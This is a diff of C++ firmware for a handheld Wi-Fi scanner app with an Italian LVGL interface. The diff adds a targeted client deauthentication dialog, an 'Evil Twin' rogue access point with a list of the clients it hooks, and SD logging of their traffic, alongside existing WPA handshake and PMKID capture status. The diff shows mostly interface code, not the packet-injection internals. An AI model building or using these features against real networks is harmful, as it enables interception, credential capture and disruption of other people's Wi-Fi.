@@ -1335,21 +1441,24 @@ lv_obj_t* addFieldLabel(lv_obj_t* row, int width) {
     return label;
 }
 
-/** A row is an lv_list button (so the badge up/down keys can focus it and scroll the list). One
- * single line: [colour bar][SSID — fills the middle, scrolls like a bus sign if too long][ch]
- * [power][security][clients], each later field in its own fixed-width column. */
+void addLegendLabel(lv_obj_t* header, const char* text, int width) {
+    auto* label = lv_label_create(header);
+    lv_obj_set_width(label, width);
+    lv_obj_set_style_text_align(label, LV_TEXT_ALIGN_RIGHT, 0);
+    lv_label_set_text(label, text);
+}
+
 lv_obj_t* createListRow(Context* ctx, uint64_t key) {
     auto* row = lv_list_add_button(ctx->list, nullptr, "");
-    lv_obj_clean(row); // drop the empty label lv_list_add_button created, we lay the row out ourselves
+    lv_obj_clean(row);
     lv_obj_set_height(row, LIST_ROW_HEIGHT);
     lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
     lv_obj_set_flex_align(row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
     lv_obj_set_style_pad_all(row, 2, 0);
     lv_obj_set_style_pad_column(row, 4, 0);
-    (void)key; // identity is tracked via ctx->rows, not user_data (see onSelectFromList)
+    (void)key;
     lv_obj_add_event_cb(row, onSelectFromList, LV_EVENT_CLICKED, ctx);
 
-    // Colour bar (same colour as this network's bell on the graph), hard left.
     auto* chip = lv_obj_create(row);
     lv_obj_set_size(chip, 6, LV_PCT(90));
     lv_obj_set_style_radius(chip, 2, 0);
@@ -1357,22 +1466,19 @@ lv_obj_t* createListRow(Context* ctx, uint64_t key) {
     lv_obj_set_style_pad_all(chip, 0, 0);
     lv_obj_remove_flag(chip, LV_OBJ_FLAG_SCROLLABLE);
 
-    // SSID, fills the middle, scrolls when longer than its space.
     auto* name = lv_label_create(row);
     lv_label_set_long_mode(name, LV_LABEL_LONG_MODE_SCROLL_CIRCULAR);
     lv_obj_set_flex_grow(name, 1);
 
-    addFieldLabel(row, COL_CH);     // child 2: channel
-    addFieldLabel(row, COL_POWER);  // child 3: data-frame rate (d/s)
-    addFieldLabel(row, COL_SEC);    // child 4: security
-    addFieldLabel(row, COL_CLI);    // child 5: client count
+    addFieldLabel(row, COL_CH);
+    addFieldLabel(row, COL_POWER);
+    addFieldLabel(row, COL_SEC);
+    addFieldLabel(row, COL_CLI);
 
     return row;
 }
 
-/** Updates rows in place. New networks are appended at the end and existing rows keep their place
- * (no re-sorting), so the selection doesn't jump while you scroll. */
-void updateRows(Context* ctx, const std::vector<SeenAp>& aps, const std::map<uint64_t, int>& clientCounts) {
+void updateRows(Context* ctx, const std::vector<SeenAp>& aps, const std::map<uint64_t, int>& clientCounts, const std::map<uint64_t, uint32_t>& dataTotals) {
     if (ctx->list == nullptr) return;
 
     std::vector<uint64_t> keys;
@@ -1392,7 +1498,7 @@ void updateRows(Context* ctx, const std::vector<SeenAp>& aps, const std::map<uin
         lv_obj_t* row = nullptr;
         auto it = ctx->rows.find(key);
         if (it == ctx->rows.end()) {
-            row = createListRow(ctx, key); // appended at the end of the list
+            row = createListRow(ctx, key);
             ctx->rows[key] = row;
         } else {
             row = it->second;
@@ -1406,16 +1512,16 @@ void updateRows(Context* ctx, const std::vector<SeenAp>& aps, const std::map<uin
         snprintf(ssidLine, sizeof(ssidLine), "%s%s", displaySsid(ap.record), ap.fromCapture ? " *" : "");
         lv_label_set_text(lv_obj_get_child(row, 1), ssidLine);
 
-        // Plain numbers only; the legend header above the list says what each column is. The middle
-        // column shows data-frame activity (d/s), not beacon count: beacons fire at a fixed rate
-        // whether or not the network is actually in use, so they're a poor proxy for activity
-        // (dBm is in the detail instead).
         char channelText[16];
-        char dataRateText[16];
+        char dataText[16];
         snprintf(channelText, sizeof(channelText), "%d", (int)ap.record.channel);
-        snprintf(dataRateText, sizeof(dataRateText), "%u", (unsigned)ap.dataFrameRate);
+        
+        auto dataIt = dataTotals.find(key);
+        uint32_t totalDataFrames = dataIt != dataTotals.end() ? dataIt->second : 0;
+        snprintf(dataText, sizeof(dataText), "%u", (unsigned)totalDataFrames);
+
         lv_label_set_text(lv_obj_get_child(row, 2), channelText);
-        lv_label_set_text(lv_obj_get_child(row, 3), dataRateText);
+        lv_label_set_text(lv_obj_get_child(row, 3), dataText);
         lv_label_set_text(lv_obj_get_child(row, 4), authToString(ap.record.authentication_type));
 
         auto countIt = clientCounts.find(key);
@@ -1425,8 +1531,6 @@ void updateRows(Context* ctx, const std::vector<SeenAp>& aps, const std::map<uin
         lv_label_set_text(lv_obj_get_child(row, 5), cliText);
     }
 }
-
-// ---- Detail page ----
 
 void onConnectPressed(lv_event_t* event) {
     auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
@@ -1440,7 +1544,7 @@ void onConnectPressed(lv_event_t* event) {
 }
 
 void updateDetail(Context* ctx) {
-    if (ctx->detailInfo == nullptr) return;
+    if (ctx->detailSsidLabel == nullptr) return;
 
     SeenAp ap{};
     bool found = false;
@@ -1448,6 +1552,7 @@ void updateDetail(Context* ctx) {
     int clientCount = 0;
     bool hsPresent = false, hsHas[4] = {}, hsPmkid = false, hsSaved = false;
     int deauthBursts = 0;
+    bool evilTwin = false;
     if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
         auto it = ctx->seen.find(ctx->selectedKey);
         if (it != ctx->seen.end()) {
@@ -1466,6 +1571,7 @@ void updateDetail(Context* ctx) {
             }
         }
         deauthBursts = ctx->deauthBurstsSent;
+        evilTwin = ctx->evilTwinActive;
         ctx->mutex.unlock();
     }
     if (!found) return;
@@ -1474,96 +1580,116 @@ void updateDetail(Context* ctx) {
     const char* vendor = lookupVendor(ap.record.bssid);
     uint32_t beaconsSinceOpen = ap.packetCount >= beaconBaseline ? ap.packetCount - beaconBaseline : 0;
 
-    char text[768];
-    int offset = snprintf(text, sizeof(text),
-        "SSID: %s\n"
-        "MAC: %s (%s)\n"
-        "Sicurezza: %s\n",
-        displaySsid(ap.record), macToString(ap.record.bssid).c_str(),
-        vendor != nullptr ? vendor : "fornitore sconosciuto",
-        authToString(ap.record.authentication_type));
+    char buf[128];
 
-    // The passive capture can only guess the cipher from beacon IEs, so show the exact cipher
-    // only for networks the active scan actually measured.
+    snprintf(buf, sizeof(buf), "SSID: %s", displaySsid(ap.record));
+    lv_label_set_text(ctx->detailSsidLabel, buf);
+
+    snprintf(buf, sizeof(buf), "MAC: %s (%s)", macToString(ap.record.bssid).c_str(), vendor != nullptr ? vendor : "sconosciuto");
+    lv_label_set_text(ctx->detailMacLabel, buf);
+
     if (!ap.fromCapture) {
-        offset += snprintf(text + offset, sizeof(text) - offset, "Cifratura: %s\n",
-            cipherToString(ap.record.pairwise_cipher));
-    }
-
-    offset += snprintf(text + offset, sizeof(text) - offset,
-        "Canale: %d (%d MHz)\n"
-        "Potenza: %d dBm (min %d / max %d)\n"
-        "Distanza stimata: %.1f m\n"
-        "PHY: %s\n"
-        "Fonte: %s\n"
-        "Beacon ricevuti (da apertura): %u\n"
-        "Visto da %u s, ultimo %u s fa\n",
-        (int)ap.record.channel, frequencyMhz((int)ap.record.channel),
-        (int)ap.record.rssi, (int)ap.rssiMin, (int)ap.rssiMax, estimateDistanceMeters(ap.record.rssi),
-        phyToString(ap.record.phy_flags).c_str(), ap.fromCapture ? "cattura passiva" : "scansione attiva",
-        (unsigned)beaconsSinceOpen,
-        (unsigned)((now - ap.firstSeenMs) / 1000), (unsigned)((now - ap.lastSeenMs) / 1000));
-
-    if (ap.record.country[0] != '\0') {
-        offset += snprintf(text + offset, sizeof(text) - offset, "Paese: %.2s\n", ap.record.country);
-    }
-
-    // Handshake status for this network (the whole point of the capture, shown under the clients).
-    if (hsPresent) {
-        offset += snprintf(text + offset, sizeof(text) - offset, "Handshake: %s%s%s%s%s%s\n",
-            hsHas[0] ? "M1 " : "", hsHas[1] ? "M2 " : "", hsHas[2] ? "M3 " : "", hsHas[3] ? "M4 " : "",
-            hsPmkid ? "+PMKID " : "", hsSaved ? "-> salvato su SD" : "(parziale)");
+        snprintf(buf, sizeof(buf), "Sicurezza: %s | Cifratura: %s", authToString(ap.record.authentication_type), cipherToString(ap.record.pairwise_cipher));
     } else {
-        offset += snprintf(text + offset, sizeof(text) - offset,
-            "Handshake: nessuno (in cattura, serve che un client si (ri)connetta)\n");
+        snprintf(buf, sizeof(buf), "Sicurezza: %s (da cattura)", authToString(ap.record.authentication_type));
     }
+    lv_label_set_text(ctx->detailSecLabel, buf);
 
-    if (deauthBursts > 0) {
-        offset += snprintf(text + offset, sizeof(text) - offset,
-            "Deauth inviati: %d\n", deauthBursts);
-    }
-    lv_label_set_text(ctx->detailInfo, text);
+    snprintf(buf, sizeof(buf), "Canale: %d (%d MHz)", (int)ap.record.channel, frequencyMhz((int)ap.record.channel));
+    lv_label_set_text(ctx->detailChanLabel, buf);
 
-    // Compact HS/PMKID count right under Deauth, so a glance tells you if it caught anything -
-    // the full M1..M4 breakdown above is still there for when you need the detail.
+    snprintf(buf, sizeof(buf), "Potenza: %d dBm (min %d / max %d) | %.1f m", (int)ap.record.rssi, (int)ap.rssiMin, (int)ap.rssiMax, estimateDistanceMeters(ap.record.rssi));
+    lv_label_set_text(ctx->detailPowerLabel, buf);
+
+    snprintf(buf, sizeof(buf), "PHY: %s | Fonte: %s", phyToString(ap.record.phy_flags).c_str(), ap.fromCapture ? "passiva" : "attiva");
+    lv_label_set_text(ctx->detailPhyLabel, buf);
+
+    snprintf(buf, sizeof(buf), "Beacon: %u | Visto: %us fa", (unsigned)beaconsSinceOpen, (unsigned)((now - ap.lastSeenMs) / 1000));
+    lv_label_set_text(ctx->detailTimeLabel, buf);
+
     if (ctx->detailHsSummary != nullptr) {
         int hsCount = (hsHas[0] ? 1 : 0) + (hsHas[1] ? 1 : 0) + (hsHas[2] ? 1 : 0) + (hsHas[3] ? 1 : 0);
-        char hsSummary[48];
-        snprintf(hsSummary, sizeof(hsSummary), "HS: %d/4%s   PMKID: %s",
-            hsCount, (hsPresent && hsSaved) ? " (salvato)" : "", hsPmkid ? "si" : "no");
+        char hsSummary[64];
+        snprintf(hsSummary, sizeof(hsSummary), "Stato -> HS: %d/4%s | PMKID: %s",
+            hsCount, (hsPresent && hsSaved) ? " (salvato)" : "", hsPmkid ? "SI" : "NO");
         lv_label_set_text(ctx->detailHsSummary, hsSummary);
     }
 
-    // Clients live on their own page now; the button just shows how many and opens it.
+    if (ctx->detailDeauthLabel != nullptr) {
+        if (deauthBursts > 0) {
+            snprintf(buf, sizeof(buf), "Deauth inviati: %d", deauthBursts);
+            lv_label_set_text(ctx->detailDeauthLabel, buf);
+            lv_obj_remove_flag(ctx->detailDeauthLabel, LV_OBJ_FLAG_HIDDEN);
+        } else {
+            lv_obj_add_flag(ctx->detailDeauthLabel, LV_OBJ_FLAG_HIDDEN);
+        }
+    }
+
     if (ctx->detailClientsButton != nullptr) {
         char buttonText[32];
-        snprintf(buttonText, sizeof(buttonText), "Client associati (%d)", clientCount);
-        lv_obj_t* label = lv_obj_get_child(ctx->detailClientsButton, lv_obj_get_child_count(ctx->detailClientsButton) - 1);
+        snprintf(buttonText, sizeof(buttonText), "Client (%d)", clientCount);
+        lv_obj_t* label = lv_obj_get_child(ctx->detailClientsButton, 0);
         if (label != nullptr) lv_label_set_text(label, buttonText);
     }
 
-    // Lock button reflects whether we're parked on THIS network's channel.
     if (ctx->detailLockButton != nullptr) {
         bool lockedHere = getCaptureLockChannel() == (int)ap.record.channel && ap.record.channel >= 1;
         char lockText[48];
         if (lockedHere) {
-            snprintf(lockText, sizeof(lockText), "Cattura mirata ATTIVA (ch %d)", (int)ap.record.channel);
+            snprintf(lockText, sizeof(lockText), LV_SYMBOL_SETTINGS " Lock (ch %d)", (int)ap.record.channel);
         } else {
-            snprintf(lockText, sizeof(lockText), "Cattura mirata su ch %d", (int)ap.record.channel);
+            snprintf(lockText, sizeof(lockText), "Channel Lock");
         }
-        lv_obj_t* label = lv_obj_get_child(ctx->detailLockButton, lv_obj_get_child_count(ctx->detailLockButton) - 1);
+        lv_obj_t* label = lv_obj_get_child(ctx->detailLockButton, 0);
         if (label != nullptr) lv_label_set_text(label, lockText);
     }
-}
 
-// ---- Clients page (all devices seen by the passive capture, Kismet-style) ----
+    if (ctx->detailEvilTwinButton != nullptr) {
+        char etText[32];
+        if (evilTwin) snprintf(etText, sizeof(etText), "Evil Twin: ON");
+        else snprintf(etText, sizeof(etText), "Evil Twin");
+        lv_obj_t* label = lv_obj_get_child(ctx->detailEvilTwinButton, 0);
+        if (label != nullptr) lv_label_set_text(label, etText);
+    }
+}
 
 constexpr int CLIENT_ROW_HEIGHT = 30;
 constexpr int COL_CDBM = 46;
 constexpr int COL_TX = 46;
 constexpr int COL_RX = 46;
+constexpr int COL_IND = 20;
 
-/** Same row shape as the networks list: [MAC (scrolls if long)][dBm][TX][RX]. */
+void onSelectClientForDeauth(lv_event_t* event) {
+    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
+    lv_obj_t* row = lv_event_get_current_target_obj(event);
+    uint64_t clientKey = 0;
+
+    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
+        for (const auto& [k, w] : ctx->clientRows) {
+            if (w == row) { clientKey = k; break; }
+        }
+        ctx->targetClientKey = clientKey;
+        ctx->mutex.unlock();
+    }
+
+    if (clientKey != 0) {
+        char macStr[18] = "";
+        if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
+            auto it = ctx->clients.find(clientKey);
+            if (it != ctx->clients.end()) {
+                snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+                    it->second.mac[0], it->second.mac[1], it->second.mac[2],
+                    it->second.mac[3], it->second.mac[4], it->second.mac[5]);
+            }
+            ctx->mutex.unlock();
+        }
+
+        char message[128];
+        snprintf(message, sizeof(message), "Invia deauth mirato al client:\n%s?", macStr);
+        ctx->clientDeauthDialogId = tt::app::alertdialog::start(ctx->appInstanceId, "Deauth Mirato", message, { "Invia", "Annulla" });
+    }
+}
+
 lv_obj_t* createClientRow(Context* ctx) {
     auto* row = lv_list_add_button(ctx->clientsList, nullptr, "");
     lv_obj_clean(row);
@@ -1577,9 +1703,18 @@ lv_obj_t* createClientRow(Context* ctx) {
     lv_label_set_long_mode(mac, LV_LABEL_LONG_MODE_SCROLL_CIRCULAR);
     lv_obj_set_flex_grow(mac, 1);
 
-    addFieldLabel(row, COL_CDBM); // child 1: dBm
-    addFieldLabel(row, COL_TX);   // child 2: TX
-    addFieldLabel(row, COL_RX);   // child 3: RX
+    addFieldLabel(row, COL_CDBM);
+    addFieldLabel(row, COL_TX);
+    addFieldLabel(row, COL_RX);
+
+    auto* indicator = lv_label_create(row);
+    lv_obj_set_width(indicator, COL_IND);
+    lv_label_set_text(indicator, LV_SYMBOL_WARNING);
+    lv_obj_set_style_text_color(indicator, lv_color_hex(0xB33A3A), 0);
+    lv_obj_set_style_text_align(indicator, LV_TEXT_ALIGN_CENTER, 0);
+
+    lv_obj_add_event_cb(row, onSelectClientForDeauth, LV_EVENT_CLICKED, ctx);
+
     return row;
 }
 
@@ -1597,7 +1732,6 @@ void updateClientsPage(Context* ctx) {
                 continue;
             }
             const auto& client = it->second;
-            // Only the clients associated to the network whose detail we came from.
             if (client.associatedBssid != selected) { ++it; continue; }
 
             bool randomMac = (client.mac[0] & 0x02) != 0;
@@ -1611,8 +1745,6 @@ void updateClientsPage(Context* ctx) {
         ctx->mutex.unlock();
     }
 
-    // Most active client (most frames) first. This decides the order only for rows being created;
-    // existing rows keep their place so scrolling doesn't jump (see the no-reorder note below).
     std::sort(clientRows2.begin(), clientRows2.end(), [](const Row& a, const Row& b) { return a.frames > b.frames; });
 
     std::vector<uint64_t> keys;
@@ -1629,7 +1761,7 @@ void updateClientsPage(Context* ctx) {
         lv_obj_t* widget;
         auto it = ctx->clientRows.find(row.key);
         if (it == ctx->clientRows.end()) {
-            widget = createClientRow(ctx); // appended at the end; order is set fresh on page open
+            widget = createClientRow(ctx);
             ctx->clientRows[row.key] = widget;
         } else {
             widget = it->second;
@@ -1643,63 +1775,6 @@ void updateClientsPage(Context* ctx) {
         lv_label_set_text(lv_obj_get_child(widget, 2), tx);
         lv_label_set_text(lv_obj_get_child(widget, 3), rx);
     }
-    // No move_to_index: existing rows stay put (stable scrolling); new ones append at the end.
-}
-
-// ---- Page switching / toolbar back handling ----
-
-void onHardwareBack(void* userData);
-
-void setTitle(Context* ctx, const char* title) {
-    if (ctx->toolbar != nullptr) lvgl_toolbar_set_title(ctx->toolbar, title);
-}
-
-void showPage(Context* ctx, Page page) {
-    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
-        ctx->page = page;
-        ctx->mutex.unlock();
-    }
-
-    lv_obj_add_flag(ctx->graphPage, LV_OBJ_FLAG_HIDDEN);
-    lv_obj_add_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);
-    lv_obj_add_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
-    lv_obj_add_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);
-
-    switch (page) {
-        case Page::Graph:
-            lv_obj_remove_flag(ctx->graphPage, LV_OBJ_FLAG_HIDDEN);
-            setTitle(ctx, "Wi-Fi Scanner");
-            break;
-        case Page::List:
-            lv_obj_remove_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);
-            setTitle(ctx, "Reti rilevate");
-            break;
-        case Page::Detail:
-            lv_obj_remove_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
-            setTitle(ctx, "Dettaglio rete");
-            // Re-entering always starts from the top, not where the previous visit was left.
-            if (ctx->detailScroll != nullptr) lv_obj_scroll_to_y(ctx->detailScroll, 0, LV_ANIM_OFF);
-            if (ctx->detailClientsButton != nullptr && lv_obj_get_group(ctx->detailClientsButton) != nullptr) {
-                lv_group_focus_obj(ctx->detailClientsButton);
-            }
-            updateDetail(ctx);
-            break;
-        case Page::Clients:
-            lv_obj_remove_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);
-            setTitle(ctx, "Client della rete");
-            // Rebuild from scratch so the order is freshly sorted by activity each time it opens
-            // (it then stays stable while you scroll).
-            for (auto& [k, w] : ctx->clientRows) lv_obj_delete(w);
-            ctx->clientRows.clear();
-            updateClientsPage(ctx);
-            if (ctx->clientsList != nullptr) lv_obj_scroll_to_y(ctx->clientsList, 0, LV_ANIM_OFF);
-            break;
-    }
-
-    // The physical back key steps one level instead of closing the app, except on the top page.
-    lvgl_toolbar_set_back_override(page == Page::Graph ? nullptr : onHardwareBack, ctx);
-
-    updateLeds(ctx); // entering/leaving the detail switches the strip to/from the per-network colour
 }
 
 void goBack(Context* ctx) {
@@ -1712,34 +1787,626 @@ void goBack(Context* ctx) {
     }
     if (current == Page::Detail) showPage(ctx, Page::List);
     else if (current == Page::List) showPage(ctx, Page::Graph);
-    else if (current == Page::Clients) showPage(ctx, Page::Detail); // clients opened from a network's detail
-}
-
-void onShowClients(lv_event_t* event) {
-    showPage(static_cast<Context*>(lv_event_get_user_data(event)), Page::Clients);
+    else if (current == Page::Clients) showPage(ctx, Page::Detail);
+    else if (current == Page::EvilTwinDetail) showPage(ctx, Page::Detail);
 }
 
 void onHardwareBack(void* userData) {
     goBack(static_cast<Context*>(userData));
 }
 
-void onBackPressed(lv_event_t* event) {
-    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
-    Page current;
-    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
-        current = ctx->page;
-        ctx->mutex.unlock();
-    } else {
-        return;
-    }
-    if (current == Page::Graph) {
-        app_event_emit_close(ctx->appInstanceId);
-    } else {
-        goBack(ctx);
+// ---- UI page builders ----
+
+lv_obj_t* createPage(lv_obj_t* parent) {
+    auto* page = lv_obj_create(parent);
+    lv_obj_set_flex_flow(page, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_width(page, LV_PCT(100));
+    lv_obj_set_flex_grow(page, 1);
+    lv_obj_set_style_pad_all(page, 0, 0);
+    lv_obj_set_style_border_width(page, 0, 0);
+    return page;
+}
+
+void createAxisLabels(lv_obj_t* parent) {
+    auto* row = lv_obj_create(parent);
+    lv_obj_set_size(row, LV_PCT(100), 16);
+    lv_obj_set_style_pad_all(row, 0, 0);
+    lv_obj_set_style_border_width(row, 0, 0);
+    lv_obj_remove_flag(row, LV_OBJ_FLAG_SCROLLABLE);
+    for (int channel = 1; channel <= 13; channel++) {
+        char text[4];
+        snprintf(text, sizeof(text), "%d", channel);
+        auto* label = lv_label_create(row);
+        lv_label_set_text(label, text);
+        lv_obj_set_x(label, lv_pct((int)(100 * channelFraction(channel))));
+        lv_obj_set_style_translate_x(label, channel < 10 ? -4 : -8, 0);
     }
 }
 
-// ---- Periodic refresh ----
+void createChannelGrid(lv_obj_t* chartWrapper) {
+    for (int channel = 1; channel <= 13; channel++) {
+        auto* line = lv_obj_create(chartWrapper);
+        lv_obj_set_size(line, 1, LV_PCT(100));
+        lv_obj_set_style_border_width(line, 0, 0);
+        lv_obj_set_style_radius(line, 0, 0);
+        lv_obj_set_style_bg_color(line, lv_color_hex(0x606060), 0);
+        lv_obj_set_style_bg_opa(line, LV_OPA_50, 0);
+        lv_obj_remove_flag(line, LV_OBJ_FLAG_SCROLLABLE);
+        lv_obj_remove_flag(line, LV_OBJ_FLAG_CLICKABLE);
+        lv_obj_set_x(line, lv_pct((int)(100 * channelFraction(channel))));
+    }
+}
+
+lv_obj_t* createIconButton(lv_obj_t* parent, const char* icon, lv_event_cb_t callback, Context* ctx, int size = 40) {
+    auto* button = lv_button_create(parent);
+    lv_obj_set_size(button, size, size);
+    lv_obj_set_style_pad_all(button, 0, 0);
+    auto* label = lv_label_create(button);
+    lv_label_set_text(label, icon);
+    lv_obj_center(label);
+    lv_obj_add_event_cb(button, callback, LV_EVENT_SHORT_CLICKED, ctx);
+    return button;
+}
+
+lv_obj_t* createSectionCard(lv_obj_t* parent, const char* titleText) {
+    auto* card = lv_button_create(parent);
+    lv_obj_set_width(card, LV_PCT(100));
+    lv_obj_set_height(card, LV_SIZE_CONTENT);
+    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_style_pad_all(card, 4, 0);
+    lv_obj_set_style_pad_row(card, 2, 0);
+    lv_obj_set_style_radius(card, 4, 0);
+    lv_obj_set_style_border_width(card, 1, 0);
+    lv_obj_set_style_border_color(card, lv_color_hex(0x505050), 0);
+    lv_obj_set_style_bg_color(card, lv_color_hex(0x181818), 0);
+    lv_obj_set_style_bg_opa(card, LV_OPA_COVER, 0);
+    lv_obj_remove_flag(card, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_add_flag(card, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
+
+    if (titleText && titleText[0] != '\0') {
+        auto* title = lv_label_create(card);
+        lv_label_set_text(title, titleText);
+        lv_obj_set_style_text_color(title, lv_color_hex(0x80C0FF), 0);
+    }
+    return card;
+}
+
+void updateEvilTwinDetailPage(Context* ctx) {
+#ifdef ESP_PLATFORM
+    if (ctx->etStatusLabel == nullptr || ctx->etClientsList == nullptr) return;
+
+    char statusBuf[160];
+    char ssid[33] = {};
+    bool active = false;
+    int channel = 0;
+    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
+        auto it = ctx->seen.find(ctx->selectedKey);
+        if (it != ctx->seen.end()) {
+            strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
+            channel = it->second.record.channel;
+        }
+        active = ctx->evilTwinActive;
+        ctx->mutex.unlock();
+    }
+
+    bool logging = ctx->evilTwinLogging.load();
+    uint32_t pkts = g_etPacketsLogged.load();
+
+    snprintf(statusBuf, sizeof(statusBuf), "SSID: %s\nCanale: %d | Stato: %s\nLog SD: %s (%u pkt)",
+        ssid[0] != '\0' ? ssid : "(nascosta)", channel,
+        active ? "ATTIVO (Rogue AP)" : "SPENTO",
+        logging ? "IN CORSO" : "FERMO", (unsigned)pkts);
+    lv_label_set_text(ctx->etStatusLabel, statusBuf);
+
+    if (ctx->etLogToggleButton != nullptr) {
+        lv_obj_t* label = lv_obj_get_child(ctx->etLogToggleButton, 0);
+        if (label != nullptr) {
+            if (logging) {
+                char btnTxt[48];
+                snprintf(btnTxt, sizeof(btnTxt), LV_SYMBOL_STOP " Ferma Log SD (%u)", (unsigned)pkts);
+                lv_label_set_text(label, btnTxt);
+            } else {
+                lv_label_set_text(label, LV_SYMBOL_SAVE " Avvia Logging Traffico SD");
+            }
+        }
+    }
+
+    if (active) {
+        wifi_sta_list_t sta_list = {};
+        if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK) {
+            lv_obj_clean(ctx->etClientsList);
+            for (int i = 0; i < sta_list.num; i++) {
+                char macStr[18];
+                snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+                    sta_list.sta[i].mac[0], sta_list.sta[i].mac[1], sta_list.sta[i].mac[2],
+                    sta_list.sta[i].mac[3], sta_list.sta[i].mac[4], sta_list.sta[i].mac[5]);
+                
+                auto* row = lv_list_add_button(ctx->etClientsList, LV_SYMBOL_WARNING, macStr);
+                lv_obj_set_height(row, 30);
+            }
+            if (sta_list.num == 0) {
+                auto* row = lv_list_add_button(ctx->etClientsList, nullptr, "Nessun client agganciato");
+                lv_obj_set_height(row, 30);
+            }
+        }
+    } else {
+        lv_obj_clean(ctx->etClientsList);
+        auto* row = lv_list_add_button(ctx->etClientsList, nullptr, "Evil Twin non attivo");
+        lv_obj_set_height(row, 30);
+    }
+#else
+    (void)ctx;
+#endif
+}
+
+void createEvilTwinDetailPage(Context* ctx, lv_obj_t* parent) {
+    ctx->etDetailPage = createPage(parent);
+    lv_obj_add_flag(ctx->etDetailPage, LV_OBJ_FLAG_HIDDEN);
+    lv_obj_set_style_pad_all(ctx->etDetailPage, 4, 0);
+
+    auto* scroll = lv_obj_create(ctx->etDetailPage);
+    lv_obj_set_width(scroll, LV_PCT(100));
+    lv_obj_set_flex_grow(scroll, 1);
+    lv_obj_set_flex_flow(scroll, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_style_pad_all(scroll, 4, 0);
+    lv_obj_set_style_pad_row(scroll, 4, 0);
+
+    auto* statusCard = createSectionCard(scroll, "Stato Rogue AP");
+    ctx->etStatusLabel = lv_label_create(statusCard);
+    lv_label_set_text(ctx->etStatusLabel, "Stato: INATTIVO");
+    lv_label_set_long_mode(ctx->etStatusLabel, LV_LABEL_LONG_MODE_WRAP);
+    lv_obj_set_width(ctx->etStatusLabel, LV_PCT(100));
+
+    ctx->etLogToggleButton = lv_button_create(scroll);
+    lv_obj_set_width(ctx->etLogToggleButton, LV_PCT(100));
+    lv_obj_set_height(ctx->etLogToggleButton, LV_SIZE_CONTENT);
+    lv_obj_set_style_pad_ver(ctx->etLogToggleButton, 6, 0);
+    lv_obj_set_style_radius(ctx->etLogToggleButton, 4, 0);
+    lv_obj_set_style_border_width(ctx->etLogToggleButton, 1, 0);
+    lv_obj_set_style_border_color(ctx->etLogToggleButton, lv_color_hex(0x505050), 0);
+    lv_obj_set_style_bg_color(ctx->etLogToggleButton, lv_color_hex(0x181818), 0);
+    lv_obj_set_style_bg_opa(ctx->etLogToggleButton, LV_OPA_COVER, 0);
+    lv_obj_add_flag(ctx->etLogToggleButton, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
+    auto* logLbl = lv_label_create(ctx->etLogToggleButton);
+    lv_label_set_text(logLbl, LV_SYMBOL_SAVE " Avvia Logging Traffico SD");
+    lv_obj_center(logLbl);
+    lv_obj_add_event_cb(ctx->etLogToggleButton, [](lv_event_t* e) {
+        auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
+        char ssid[33] = {};
+        if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
+            auto it = ctx->seen.find(ctx->selectedKey);
+            if (it != ctx->seen.end()) {
+                strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
+            }
+            ctx->mutex.unlock();
+        }
+
+        bool wasLogging = ctx->evilTwinLogging.load();
+        if (!wasLogging) {
+            if (startEvilTwinLogging(ssid[0] != '\0' ? ssid : "eviltwin")) {
+                ctx->evilTwinLogging.store(true);
+            }
+        } else {
+            stopEvilTwinLogging();
+            ctx->evilTwinLogging.store(false);
+        }
+        updateEvilTwinDetailPage(ctx);
+    }, LV_EVENT_CLICKED, ctx);
+
+    auto* clientsCard = createSectionCard(scroll, "Client Agganciati al Rogue AP");
+    ctx->etClientsList = lv_list_create(clientsCard);
+    lv_obj_set_width(ctx->etClientsList, LV_PCT(100));
+    lv_obj_set_height(ctx->etClientsList, 120);
+    lv_obj_set_style_pad_all(ctx->etClientsList, 0, 0);
+}
+
+void createDetailPage(Context* ctx, lv_obj_t* parent) {
+    ctx->detailPage = createPage(parent);
+    lv_obj_add_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
+    lv_obj_set_style_pad_all(ctx->detailPage, 2, 0);
+
+    auto* scroll = lv_obj_create(ctx->detailPage);
+    lv_obj_set_width(scroll, LV_PCT(100));
+    lv_obj_set_flex_grow(scroll, 1);
+    lv_obj_set_flex_flow(scroll, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_style_pad_all(scroll, 4, 0);
+    lv_obj_set_style_pad_row(scroll, 4, 0);
+    ctx->detailScroll = scroll;
+
+    // Contenitore griglia 2x2 per i primi 4 tasti
+    auto* gridContainer = lv_obj_create(scroll);
+    lv_obj_set_width(gridContainer, LV_PCT(100));
+    lv_obj_set_height(gridContainer, LV_SIZE_CONTENT);
+    lv_obj_set_flex_flow(gridContainer, LV_FLEX_FLOW_ROW_WRAP);
